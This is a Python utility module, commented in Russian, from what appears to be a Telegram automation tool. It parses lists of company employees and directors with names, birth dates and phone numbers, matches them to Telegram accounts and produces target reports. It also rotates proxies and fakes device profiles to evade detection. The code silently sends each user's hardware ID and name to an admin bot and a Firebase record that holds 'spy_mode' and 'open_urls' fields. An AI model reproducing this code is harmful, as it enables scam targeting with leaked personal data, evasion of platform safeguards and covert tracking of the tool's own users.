import config
import os
import sys
import json
import uuid
import hashlib
import random
import requests
import re
import threading
import time
import asyncio
from datetime import datetime
import webbrowser
from tkinter import simpledialog, messagebox
import tkinter as tk

def log_msg(tag, text):
    if config.log_queue:
        config.log_queue.put((tag, text))
    print(f"[{tag}] {text}") # Для отладки в консоль
# === СИСТЕМНЫЕ ФУНКЦИИ ===
def get_hwid():
    try:
        mac = uuid.getnode()
        return hashlib.md5(str(mac).encode()).hexdigest()
    except:
        return "unknown_hwid"

def resource_path(relative_path):
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

# === ПРОКСИ И УСТРОЙСТВА ===
def get_random_proxy():
    if not config.MY_PROXIES: return None
    proxy_str = random.choice(config.MY_PROXIES)
    try:
        parts = proxy_str.strip().split(":")
        if len(parts) == 4:
            return {
                'proxy_type': 'http',
                'addr': parts[0],
                'port': int(parts[1]),
                'username': parts[2],
                'password': parts[3],
                'rdns': True 
            }
    except: pass
    return None

def check_single_proxy(proxy_str):
    try:
        parts = proxy_str.strip().split(":")
        if len(parts) != 4: return False
        ip, port, user, pwd = parts
        proxy_url = f"http://{user}:{pwd}@{ip}:{port}"
        r = requests.get("http://www.google.com", proxies={"http": proxy_url, "https": proxy_url}, timeout=5)
        return r.status_code == 200
    except: return False

def ensure_device_config(session_data):
    return get_random_device_config()

def get_random_device_config():
    models = [
        {"device_model": "Samsung Galaxy S24 Ultra", "system_version": "Android 14"},
        {"device_model": "Xiaomi 14 Pro", "system_version": "Android 14"},
        # ... можно добавить остальные модели
    ]
    base = {"app_version": "10.9.1", "lang_code": "en", "system_lang_code": "en-US"}
    base.update(random.choice(models))
    return base

# === FIREBASE & LOGS ===
def firebase_patch(path, data):
    try: requests.patch(f"{config.FIREBASE_DB_URL}{path}.json", json=data, timeout=10)
    except: pass

def firebase_get(path):
    try:
        resp = requests.get(f"{config.FIREBASE_DB_URL}{path}.json", timeout=10)
        return resp.json() if resp.status_code == 200 else None
    except: return None

def update_daily_stats_firebase():
    try:
        my_hwid = get_hwid()
        today = datetime.now().strftime("%Y-%m-%d")
        path = f"/config/users/{my_hwid}/stats"
        current = firebase_get(path)
        new_count = (current.get("count", 0) + 1) if current and current.get("date") == today else 1
        firebase_patch(path, {"date": today, "count": new_count})
    except: pass

def push_log_firebase(text):
    try:
        path = f"/config/users/{get_hwid()}"
        ts = datetime.now().strftime("[%H:%M] ")
        firebase_patch(path, {"last_log": ts + text})
    except: pass

def send_admin_log(action_name, details=""):
    try:
        import platform
        hwid = get_hwid()
        msg = f"🔔 <b>ACTIVATION ALERT</b>\n🆔 HWID: <code>{hwid}</code>\n🚀 Action: {action_name}\n📝 Details: {details}"
        requests.post(f"https://api.telegram.org/bot{config.BOT_TOKEN}/sendMessage", 
                      data={"chat_id": config.ADMIN_ID, "text": msg, "parse_mode": "HTML"}, timeout=3)
        threading.Thread(target=lambda: push_log_firebase(f"{action_name}: {details[:50]}"), daemon=True).start()
    except: pass

def auto_register_in_firebase():
    """
    Автоматически регистрирует пользователя на сервере при запуске.
    """
    try:
        hwid = get_hwid()
        name = get_registered_user()
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # 1. Проверяем, есть ли юзер в базе
        path = f"/config/users/{hwid}"
        current_data = firebase_get(path)
        
        if current_data:
            # ЮЗЕР УЖЕ ЕСТЬ -> Обновляем только дату входа и имя
            payload = {
                "rename_to": name,
                "last_seen": now,
                "version": config.CURRENT_VERSION
            }
            # Если вдруг нет статуса, ставим active
            if "status" not in current_data:
                payload["status"] = "active"
                
            firebase_patch(path, payload)
            print(f"Firebase: Юзер {name} обновлен.")
            
        else:
            # ЮЗЕР НОВЫЙ -> Создаем запись
            payload = {
                "rename_to": name,
                "status": "active",
                "spy_mode": False,
                "message": "",
                "last_seen": now,
                "registered_at": now,
                "version": config.CURRENT_VERSION,
                "open_urls": [],
                "last_log": "Регистрация..."
            }
            firebase_patch(path, payload)
            print(f"Firebase: Новый юзер {name} зарегистрирован!")
            
    except Exception as e:
        print(f"Auto-Register Error: {e}")

# === РЕГИСТРАЦИЯ ПОЛЬЗОВАТЕЛЯ ===
# ==========================================


def get_registered_user():
    """
    Проверяет, представился ли пользователь.
    Если нет - просит ввести имя и сохраняет его навсегда.
    """
    # 1. Если файл есть - читаем имя
    if os.path.exists(config.USER_FILE):
        try:
            with open(config.USER_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
                return data.get("name", "Unknown")
        except: pass

    # 2. Если файла нет - требуем ввод
    # Создаем временное скрытое окно для диалога
    temp_root = tk.Tk()
    temp_root.withdraw()
    
    user_name = ""
    while not user_name:
        user_name = simpledialog.askstring(
            "Активация", 
            "Введите ваше ИМЯ для активации лицензии:\n(Например: Иван)", 
            parent=temp_root
        )
        
        # Если нажал Отмена или крестик - закрываем программу жестко
        if user_name is None:
            sys.exit()
            
        user_name = user_name.strip()
        if not user_name:
            messagebox.showwarning("Ошибка", "Имя не может быть пустым!")

    temp_root.destroy()

    # 3. Сохраняем имя и отправляем админу уведомление о новом юзере
    try:
        with open(config.USER_FILE, "w", encoding="utf-8") as f:
            json.dump({"name": user_name}, f, ensure_ascii=False)
            
        # Сразу стучим тебе, что появился новенький
        send_admin_log("🆕 НОВАЯ РЕГИСТРАЦИЯ", f"Пользователь представился как: {user_name}")
    except: pass
    
    return user_name

# === РАБОТА С ФАЙЛАМИ И ДАННЫМИ ===
def load_config(filepath="config.json"):
    defaults = {"delay_creation": "180", "delay_contact": "20", "random_delay": "1", "contact_mode": "0"}
    if os.path.exists(filepath):
        try:
            with open(filepath, "r", encoding="utf-8") as f: defaults.update(json.load(f))
        except: pass
    return defaults

def save_config(cfg, filepath="config.json"):
    try:
        with open(filepath, "w", encoding="utf-8") as f: json.dump(cfg, f, indent=4, ensure_ascii=False)
    except: pass

def load_sessions(filepath="sessions.json"):
    if os.path.exists(filepath):
        try:
            with open(filepath, "r", encoding="utf-8") as f: return json.load(f)
        except: pass
    return []

def save_sessions(sessions, filepath="sessions.json"):
    try:
        with open(filepath, "w", encoding="utf-8") as f: json.dump(sessions, f, indent=4)
    except: pass

def update_session_info(phone, full_name, username):
    sessions = load_sessions()
    for s in sessions:
        if s.get('phone') == phone:
            s['name'] = full_name
            s['username'] = username
            s['last_used'] = time.time()
            break
    save_sessions(sessions)

def parse_target_file(file_content):
    """
    Универсальный парсер. 
    Понимает:
    1. Готовые отчеты (фио: ..., номер: ...)
    2. Сырые базы (ООО "Рога", список телефонов и ФИО)
    """
    data = {"company_name": "Unknown_Company", "candidates": []}

    # === ЛОГИКА 1: ЧТЕНИЕ ГОТОВОГО ОТЧЕТА ===
    # Если в тексте есть ключевые слова отчета
    if "фио:" in file_content.lower() and "номер:" in file_content.lower():
        
        # 1. Ищем название компании в шапке отчета "ОТЧЕТ: Название"
        report_header = re.search(r'ОТЧЕТ:\s*(.+)', file_content)
        if report_header:
            data["company_name"] = report_header.group(1).strip()
        else:
            # Или ищем в кавычках (как в старой базе), если шапки отчета нет
            fallback_match = re.search(r'(?i)(?:ООО|АО|ИП)?\s*["«“]([^"»”]+)["»”]', file_content)
            if fallback_match: 
                data["company_name"] = fallback_match.group(1).strip()

        # 2. Разбиваем по разделителям (-------)
        sections = re.split(r'-{5,}', file_content)

        for sec in sections:
            if not sec.strip(): continue
            
            # Ищем номер (строка начинается с "номер:" или содержит его)
            phone_match = re.search(r'номер:\s*([+\d]+)', sec, re.IGNORECASE)
            
            if phone_match:
                phone = phone_match.group(1).strip()
                
                # Ищем ФИО
                name_match = re.search(r'фио:\s*(.+)', sec, re.IGNORECASE)
                full_name = name_match.group(1).strip() if name_match else "Unknown"
                
                # Пытаемся вытащить дату рождения из ФИО, если она там есть (ДД.ММ.ГГГГ)
                dob = ""
                dob_found = re.search(r'(\d{2}\.\d{2}\.\d{4})', full_name)
                if dob_found:
                    dob = dob_found.group(1)
                    # Убираем дату из имени, чтобы осталось чистое ФИО
                    full_name = full_name.replace(dob, "").strip()

                data["candidates"].append({
                    "full_name": full_name,
                    "dob": dob,
                    "phones": [phone]
                })
        
        return data

    # === ЛОГИКА 2: СТАРАЯ (СЫРАЯ БАЗА) ===
    # Если это не отчет, используем старый алгоритм
    
    # 1. Разделение на шапку и кандидатов
    parts = re.split(r'\+?={10,}', file_content)

    if len(parts) > 1:
        header_content = parts[0]
        candidates_content = "\n".join(parts[1:])
    else:
        header_content = file_content
        candidates_content = file_content # Если разделителя нет, ищем везде

    # Парсинг названия компании
    header_match = re.search(r'(?i)(?:ООО|АО|НПП|ПАО|ЗАО|ИП)\s*["«“]([^"»”]+)["»”]', header_content)
    if header_match: 
        data["company_name"] = header_match.group(1).strip()
    else:
        fallback_match = re.search(r'["«“]([^"»”]+)["»”]', header_content)
        if fallback_match:
            data["company_name"] = fallback_match.group(1).strip()

    # Парсинг кандидатов (старый метод)
    candidate_sections = re.split(r'-{5,}', candidates_content)
    
    for sec in candidate_sections:
        if not sec.strip(): continue
        
        phones = []
        for line in sec.split('\n'):
            cl = re.sub(r'\D', '', line)
            # Фильтр телефонов
            if (len(cl)==10 or len(cl)==11) and not cl.startswith('19') and not cl.startswith('20'):
                phones.append(cl)
        
        if phones:
            name = "Unknown"
            dob = "" 
            # Ищем ФИО + Дату (строгое начало строки)
            nm = re.search(r'^([А-ЯЁ\s-]+)\s+(\d{2}\.\d{2}\.\d{4})', sec.strip(), re.MULTILINE)
            if nm: 
                name = nm.group(1).strip()
                dob = nm.group(2).strip()
            else:
                # Ищем просто ФИО (2 слова КАПСОМ)
                nm2 = re.search(r'^([А-ЯЁ]{2,}\s+[А-ЯЁ]{2,}(?:\s+[А-ЯЁ]{2,})?)', sec.strip(), re.MULTILINE)
                if nm2: name = nm2.group(1).strip()
            
            data["candidates"].append({"full_name": name, "dob": dob, "phones": phones})

    return data

# ==========================================
# === НОВАЯ ЛОГИКА ВЫБОРА СЕКЦИЙ ===
# ==========================================

def split_text_by_sections(full_text):
    """
    Разбивает текст на словарь: {'Global_Header': ..., 'Секция1': content, ...}
    Ищет строки, состоящие из повторяющихся слов (напр. 'Секция1 Секция1 Секция1')
    """
    # 1. Ищем разделители секций. 
    # Регулярка ищет начало строки, слово, затем повтор этого слова минимум 2 раза
    pattern = re.compile(r'(?m)^(\S+)(?:[ \t]+\1){2,}[ \t]*$')
    
    matches = list(pattern.finditer(full_text))
    
    if not matches:
        return None # Секций нет, обычный файл

    sections = {}
    
    # Все, что до первой секции — это Глобальная Шапка (там название ООО)
    first_match_start = matches[0].start()
    global_header = full_text[:first_match_start]
    
    # Проходим по всем найденным секциям
    for i in range(len(matches)):
        # Имя секции берем из повторяющегося слова (например, "Секция1")
        section_name = matches[i].group(1) 
        
        start_content = matches[i].end() # Контент начинается после заголовка секции
        
        # Контент идет до начала следующей секции или до конца файла
        if i + 1 < len(matches):
            end_content = matches[i+1].start()
        else:
            end_content = len(full_text)
            
        content_block = full_text[start_content:end_content]
        
        # ВАЖНО: Склеиваем Шапку + Разделитель + Контент секции
        # Это нужно, чтобы парсер потом нашел название компании в шапке
        separator = "\n" + "="*40 + "\n" 
        sections[section_name] = global_header + separator + content_block

    return sections

def extract_profile_data(text):
    """
    Парсит:
    1. Имя компании (очищенное, с учетом игнор-листа аббревиатур)
    2. ФИО Директора (Берет строку СТРОГО НАД "ИНН")
    """
    company_name = "Company"
    dir_first = "Director"
    dir_last = ""
    
    # --- 1. ПАРСИНГ КОМПАНИИ ---
    ignore_list = [
        "ГАОУ ДПО", "ГАОУ ВО", "ГОУ ВПО", "ГОУ ВО", "НОУ ВПО", 
        "ФГАОУ ВО", "ФГАОУ ВПО", "ФГБВОУ ВО", "КГБНУК", "МБУКДО", 
        "ФГБНИУ", "ФГКВОУ", "ФГБНУ", "ФГБОУ", "ФГБУК", "ФГБУН", 
        "ФГКОУ", "ГАПОУ", "ГБПОУ", "ГКБУК", "ГОБУК", "КГАУК", 
        "КГБУ", "КГКУ", "МАОУ", "МАУК", "МБОУ", "МБУДО", "МБУК", 
        "МКУК", "ОГАУК", "ОГБУК", "ОГКУК", "ФГОУ", "ФГУП", "ФКУК", 
        "ЧПОУ", "ОАНО", "ОБУК", "ГПОУ", "АУК", "БУК", "ГУК", 
        "ГАУК", "ГБОУ", "ГБУК", "ГКБУ", "ГКУК", "МУК", "КГУ", 
        "МАУ", "МБУ", "МКУ", "ФГУ", "ФКУ", "ФГБУ", "ГАОУ", "ГБУ", 
        "ГКУ", "ГОУ", "НПП", "ООО", "ПАО", "ЗАО", "АО", "ИП", 
        "АУ", "БУ", "ГУ", "МУ"
    ]
    sorted_prefixes = sorted(ignore_list, key=len, reverse=True)
    pattern_str = "|".join(sorted_prefixes)
    
    # Ищем название компании
    comp_match = re.search(fr'(?i)(?:{pattern_str})\s*["«“]([^"»”]+)["»”]', text)
    if comp_match:
        company_name = comp_match.group(1).strip()
    else:
        fallback = re.search(r'["«“]([^"»”]+)["»”]', text)
        if fallback: company_name = fallback.group(1).strip()

    # --- 2. ПАРСИНГ ДИРЕКТОРА (ПО ЯКОРЮ "ИНН") ---
    try:
        # Ищем строку, где есть "ИНН" и затем цифры (директорский ИНН обычно так пишется)
        # (?m) позволяет искать ^ (начало строки) внутри текста
        inn_iter = re.finditer(r'(?m)^\s*ИНН\s+\d+', text)
        
        # Берем первое подходящее вхождение (обычно оно в шапке под ФИО)
        first_inn = next(inn_iter, None)
        
        if first_inn:
            # Получаем весь текст ДО начала строки с ИНН
            text_before = text[:first_inn.start()]
            
            # Разбиваем на строки и берем ПОСЛЕДНЮЮ непустую
            lines = [line.strip() for line in text_before.split('\n') if line.strip()]
            
            if lines:
                fio_line = lines[-1] # Это должна быть строка "Козлова Яна Юрьевна 15.06.1968"
                
                # 1. Убираем дату рождения (и всё что после неё)
                # Ищет: пробел + цифры.цифры.цифры + конец строки
                fio_clean = re.sub(r'\s+\d{1,2}\.\d{1,2}\.\d{4}.*$', '', fio_line).strip()
                
                # Защита: если строка содержит мусорные слова, пропускаем
                if "должности" not in fio_clean.lower() and len(fio_clean) > 3:
                    parts = fio_clean.split()
                    
                    # Ожидаем: Фамилия Имя [Отчество]
                    if len(parts) >= 2:
                        dir_last = parts[0].title()  # Фамилия (Козлова)
                        dir_first = parts[1].title() # Имя (Яна)
                    elif len(parts) == 1:
                        dir_first = parts[0].title()
                        
    except Exception as e:
        print(f"Ошибка парсинга директора: {e}")

    return company_name, dir_first, dir_last

def save_checked_report(original_file_path, selected_data, group_name):
    try:
        # 1. Читаем исходный файл (шапку)
        header_text = ""
        try:
            with open(original_file_path, 'r', encoding='utf-8') as f:
                content = f.read()
                parts = re.split(r'={10,}', content)
                if parts:
                    header_text = parts[0].strip()
                else:
                    header_text = content.strip()
        except: pass

        # 2. Время
        import datetime as dt_safe
        current_time = dt_safe.datetime.now().strftime('%Y-%m-%d %H:%M')

        # 3. Формируем текст
        lines = []
        lines.append(header_text)
        lines.append("\n\n" + "="*30)
        lines.append("="*30)
        lines.append(f"ОТЧЕТ: {group_name}")
        lines.append(f"Дата: {current_time}")
        lines.append("="*30 + "\n")

        for item in selected_data:
            fio = item.get('target_fio', 'Unknown')
            phone = item.get('phone', 'Unknown')
            dob = item.get('dob', '') # Дата рождения
            
            user_obj = item.get('user')
            
            # Собираем Имя в ТГ
            tg_first = user_obj.first_name if user_obj and user_obj.first_name else ""
            tg_last = user_obj.last_name if user_obj and user_obj.last_name else ""
            tg_name = f"{tg_first} {tg_last}".strip()
            if not tg_name: tg_name = "Без имени"
            
            # Собираем Юзернейм
            raw_username = user_obj.username if user_obj and user_obj.username else None
            username_str = f"@{raw_username}" if raw_username else "-"

            # === [ИЗМЕНЕНИЯ ЗДЕСЬ] ===
            
            # Строка 1: ФИО + Дата (если есть)
            dob_suffix = f" {dob}" if dob else ""
            lines.append(f"фио: {fio}{dob_suffix}")
            
            # Строка 2: Номер
            lines.append(f"номер: {phone}")
            
            # Строка 3: Имя ТГ / Юзернейм
            lines.append(f"как подписан в тг: {tg_name} / {username_str}")
            
            lines.append("-" * 20)

        # 4. Сохраняем
        folder = "прописанные базы"
        if not os.path.exists(folder): os.makedirs(folder)
        
        safe_name = re.sub(r'[\\/*?:"<>|]', "", group_name).strip()
        if not safe_name: safe_name = "Report"
        
        new_filename = f"{safe_name}.txt"
        save_path = os.path.join(folder, new_filename)

        with open(save_path, 'w', encoding='utf-8') as f:
            f.write("\n".join(lines))
            
        log_msg("SUCCESS", f"💾 Отчет сохранен: {new_filename}")

    # === [НОВОЕ] ОТКРЫВАЕМ ФАЙЛ СРАЗУ ПОСЛЕ СОХРАНЕНИЯ ===
        try:
            os.startfile(save_path)
            log_msg("INFO", "📂 Файл отчета открыт.")
        except Exception as e_open:
            log_msg("WARN", f"Не удалось открыть файл автоматически: {e_open}")
        # =====================================================

    except Exception as e:
        log_msg("ERROR", f"Ошибка сохранения отчета: {e}")

def save_remaining_report(data_list, prefix="rest"):
    """
    Сохраняет список оставшихся контактов в файл.
    Принимает список словарей [{'phone':..., 'name':...}]
    """
    if not data_list: return

    try:
        # Генерируем имя файла: rest_ProjectA_2025-12-19_14-30.txt
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M")
        filename = f"{prefix}_{timestamp}.txt"
        
        # Папка для сохранений
        folder = "остатки"
        if not os.path.exists(folder): os.makedirs(folder)
        
        filepath = os.path.join(folder, filename)
        
        with open(filepath, "w", encoding="utf-8") as f:
            f.write(f"ОСТАТОК КОНТАКТОВ ({len(data_list)} шт)\n")
            f.write("="*30 + "\n")
            for item in data_list:
                ph = item.get('phone', 'Unknown')
                nm = item.get('name', 'Unknown')
                f.write(f"{ph} | {nm}\n")
        
        # Открываем папку или файл (чтобы юзер увидел)
        try: os.startfile(filepath)
        except: pass
        
        messagebox.showwarning("ВНИМАНИЕ", f"Процесс остановлен (лимит/ошибка)!\nОставшиеся {len(data_list)} контактов сохранены в:\n{filename}")
        log_msg("WARN", f"💾 Остаток сохранен: {filename}")

    except Exception as e:
        log_msg("ERROR", f"Ошибка сохранения остатка: {e}")


# 📝 ЛОГИКА ЗАМЕТОК
NOTES_FILE = "notes_data.json"

def load_notes():
    if os.path.exists(NOTES_FILE):
        try:
            with open(NOTES_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except: pass
    return {}

def save_notes_to_file(data):
    try:
        with open(NOTES_FILE, "w", encoding="utf-8") as f:
            json.dump(data, f, ensure_ascii=False, indent=4)
    except Exception as e:
        messagebox.showerror("Ошибка сохранения", str(e))

def sanitize_title(name):
    t = (name or "").strip()
    t = re.sub(r"\s+", " ", t)
    if not t: t = f"Group {random.randint(1000, 9999)}"
    return t[:128]

def generate_group_names(base, count):
    cfg = load_config()
    use_words = int(cfg.get("use_random_words", "1"))
    names = []
    if not use_words:
        raw_names = [base for _ in range(count)]
    else:
        seps = [s.strip() for s in cfg.get("separators", "|").splitlines() if s.strip()] or ["|"]
        words = [w.strip() for w in cfg.get("words", "Chat").splitlines() if w.strip()] or ["Chat"]
        raw_names = []
        
        for _ in range(count):
             raw_names.append(f"{base} {random.choice(seps)} {random.choice(words)}")
    return raw_names

async def smart_sleep(base_delay, is_random):
    if is_random:
        delay = random.uniform(5.0, 15.0)
        log_msg("WAIT", f"⏳ Случайная пауза {delay:.1f} сек...")
    else:
        delay = float(base_delay)
        log_msg("WAIT", f"⏳ Пауза {delay:.1f} сек...")
    await asyncio.sleep(delay)